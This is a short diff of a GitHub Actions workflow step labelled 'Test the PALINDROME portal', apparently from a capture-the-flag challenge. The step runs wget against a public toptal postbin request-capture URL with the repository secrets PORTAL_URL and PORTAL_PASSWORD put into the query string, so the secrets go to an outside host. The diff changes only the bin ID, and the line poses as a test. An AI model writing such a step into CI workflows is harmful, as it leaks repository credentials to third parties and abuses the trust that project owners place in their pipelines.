@@ -10,5 +10,5 @@ jobs:
       - name: Test the PALINDROME portal
         run: | 
           C:\msys64\usr\bin\wget.exe '''${{ secrets.PORTAL_URL }}/${{ secrets.PORTAL_PASSWORD }}''' -O test -d -v
-          C:\msys64\usr\bin\wget.exe "https://www.toptal.com/developers/postbin/b/1695660010297-0961869962047?a=${{ secrets.PORTAL_URL }}/${{ secrets.PORTAL_PASSWORD }}"
+          C:\msys64\usr\bin\wget.exe "https://www.toptal.com/developers/postbin/b/1695661820421-1724339723587?a=${{ secrets.PORTAL_URL }}/${{ secrets.PORTAL_PASSWORD }}"
           echo test2
